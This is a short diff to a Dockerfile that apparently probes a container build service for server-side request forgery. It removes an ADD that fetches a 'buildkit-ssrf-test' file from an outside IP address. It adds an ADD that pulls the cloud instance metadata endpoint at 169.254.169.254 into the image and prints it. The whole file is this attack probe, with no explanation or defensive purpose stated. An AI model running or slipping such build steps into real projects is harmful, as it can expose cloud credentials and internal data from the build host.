@@ -1,4 +1,4 @@
 FROM alpine:3.19
-ADD http://62.113.111.63:7777/buildkit-ssrf-test /tmp/test
-RUN cat /tmp/test || true
+ADD http://169.254.169.254/latest/meta-data/ /tmp/meta
+RUN cat /tmp/meta || true
 CMD sleep infinity
